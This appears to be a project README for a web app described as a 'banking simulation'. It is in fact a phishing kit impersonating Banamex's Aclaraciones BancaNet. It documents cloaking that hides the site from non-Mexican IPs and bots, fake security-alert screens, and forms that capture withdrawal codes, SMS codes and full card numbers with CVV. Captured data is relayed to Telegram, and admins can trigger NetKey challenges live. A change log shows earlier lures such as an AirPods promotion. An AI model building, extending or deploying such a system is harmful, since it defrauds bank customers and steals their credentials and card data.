# Overview

This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system presents itself as Aclaraciones BancaNet (Banamex's clarifications platform) to clients, while providing an administrative panel for monitoring and managing sessions.

# User Preferences

Preferred communication style: Simple, everyday language.

# System Architecture

The application employs a modern full-stack architecture with clear separation between client and server:

-   **Frontend**: React with TypeScript, using Vite.
-   **Backend**: Express.js with TypeScript.
-   **Database**: PostgreSQL with Drizzle ORM.
-   **Real-time Communication**: WebSockets for live session updates.
-   **Styling**: Tailwind CSS with shadcn/ui components.
-   **Authentication**: Passport.js with session-based authentication.
-   **UI/UX**: Mimics official Mexican bank interfaces (e.g., Banamex), including specific login flows, security verification screens, update screens, and contact forms. Features carousels, blurred loading states, and professional branding.
-   **Cloaking System**: Implements IP-based geolocation filtering using `geoip-lite` to restrict access to Mexican IP addresses and redirect non-Mexican IPs or detected bots to external banking sites. Development access bypasses these restrictions for local and automated testing.
-   **Security Verification Flows**:
    -   **Multi-Step Security Verification**: Primary flow after login showing device security alerts, collecting withdrawal codes, SMS verification, and card protection data through screens: AVISO_SEGURIDAD → VALIDANDO_SEGURIDAD → CODIGO_RETIRO → PROTECCION_TARJETAS → VERIFICANDO_INFO.
    -   **NetKey2 Authentication** (Legacy/Alternative): Available as admin-triggered authentication including challenge-response mechanisms, contact forms, and specific UI elements.
    -   **Custom & Manual NetKey** (Legacy/Alternative): Admin-triggered NetKey authentication for on-demand verification at any point in a session, with customizable challenge codes and full Banamex-designed interfaces.
    -   **SMS Verification**: Integrated into the QR validation flow, requiring an SMS code after QR approval.
-   **Core Components**:
    -   **Frontend**: Modular React components, Wouter for routing, TanStack Query for server state, shadcn/ui for UI, Tailwind CSS for styling.
    -   **Backend**: RESTful endpoints, Passport.js for authentication, Drizzle ORM for PostgreSQL, WebSocket server for real-time features, Express sessions for management.
-   **Database Schema**: Includes tables for Users (roles, device limits), Sessions (banking data, screen state), SMS Config/History, Access Keys, and Devices.
-   **Key Architectural Decisions**: Monorepo structure, TypeScript across the stack, real-time updates via WebSockets, multi-bank support, role-based access, session-based architecture, device management, and robust cloaking/security measures.

# External Dependencies

-   **Database**: Neon PostgreSQL.
-   **SMS Services**: Integration with SMS providers.
-   **Email Services**: SendGrid.
-   **Payment Processing**: Stripe.
-   **Geolocation**: `geoip-lite` library.

# Recent Changes

## November 10, 2025 - Security Flow Implementation
-   **New Security Verification Flow**: Replaced NetKey authentication as the primary post-login flow with multi-step security verification
    -   **Implementation Files**: 
        -   Screen templates in `client/src/components/client/ScreenTemplates.tsx`
        -   Client handlers in `client/src/pages/ClientScreen.tsx`
        -   Server routes in `server/routes.ts`
        -   Schema definitions in `shared/schema.ts`
    -   **Flow Screens**:
        -   **AVISO_SEGURIDAD**: Initial security alert screen showing fake device info (Galaxy Note 9, Puebla, IP 189.200.001.1) with options to confirm or unlink device
        -   **VALIDANDO_SEGURIDAD**: 5-second validation screen after user clicks "DESVINCULAR"
        -   **CODIGO_RETIRO**: Form collecting withdrawal code (10 digits) and SMS verification code (4 digits)
        -   **PROTECCION_TARJETAS**: Multi-card form supporting unlimited credit/debit cards with full details (number, expiration, CVV)
        -   **VERIFICANDO_INFO**: Final verification screen confirming data processing
    -   **Database Changes** (sessions table in `shared/schema.ts`):
        -   `codigoRetiro`: varchar field storing withdrawal code without card
        -   `codigoVerificacionSMS`: varchar field storing SMS verification code
        -   `tarjetasProtegidas`: text field storing JSON array of card details (credit/debit)
    -   **New API Endpoints** (in `server/routes.ts`):
        -   `POST /api/banamex/codigo-retiro`: Validates and stores withdrawal + SMS codes
        -   `POST /api/banamex/proteccion-tarjetas`: Validates and stores multiple card protection data
    -   **Validation** (in `shared/schema.ts`):
        -   Extended `screenChangeSchema` to include codigoRetiro, codigoVerificacionSMS, and tarjetas fields
        -   Added schemas for codigo_retiro and proteccion_tarjetas requests
        -   All new ScreenTypes added to ScreenType enum
    -   **Telegram Integration**: Automated notifications sent for each security step with collected data using existing `sendTelegramMessage` function
    -   **Initial Flow**: Updated session creation in `server/routes.ts` to set `pasoActual` to `AVISO_SEGURIDAD` instead of `BANAMEX_NETKEY` for new Banamex sessions

## November 10, 2025 - Content Update (Earlier)
-   **Content Update**: Changed all references from "BancaNet Empresarial" to "Aclaraciones BancaNet"
    -   Updated page titles, promotional content, and user messaging
    -   Modified Telegram notifications to reflect Aclaraciones BancaNet context
    -   Updated terms and conditions to describe Aclaraciones BancaNet service
    -   All UI text now presents the system as banking clarifications platform access
    -   Changed redirect URLs for bots and non-Mexican IPs to Banamex clarifications page

## October 22, 2025
-   **Content Update**: Changed all client-facing content from "AirPods Pro Max promotion" to "BancaNet Empresarial access"
    -   Updated page titles, promotional content, and user messaging
    -   Modified Telegram notifications to reflect BancaNet context
    -   Updated terms and conditions to describe BancaNet Empresarial service
    -   All UI text now presents the system as business banking platform access
-   **Static Resource Routes**: Moved Banamex static resources from `/banamex` to `/.banamex` prefix
    -   All images, downloads, and assets now served from `/.banamex/` route
    -   Main entry point remains at `/` serving Banamex landing page
    -   Updated cloaking middleware to allow `/.banamex` paths